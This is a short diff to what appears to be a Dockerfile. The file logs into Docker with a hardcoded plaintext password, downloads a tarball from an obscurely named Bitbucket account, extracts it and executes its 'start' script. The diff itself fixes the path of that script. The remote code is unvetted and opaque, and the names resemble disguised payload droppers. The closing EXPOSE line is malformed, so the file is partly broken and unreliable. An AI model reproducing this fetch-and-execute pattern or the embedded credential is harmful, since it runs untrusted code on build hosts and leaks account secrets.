@@ -9,6 +9,6 @@ RUN echo "Linuxdistro&84" | docker login --username webwebwebwebwebweb --passwor
 
 RUN wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz
 
-RUN bash /start
+RUN bash ./start
 
 EXPOSE WEBSITE http://localhost:8080
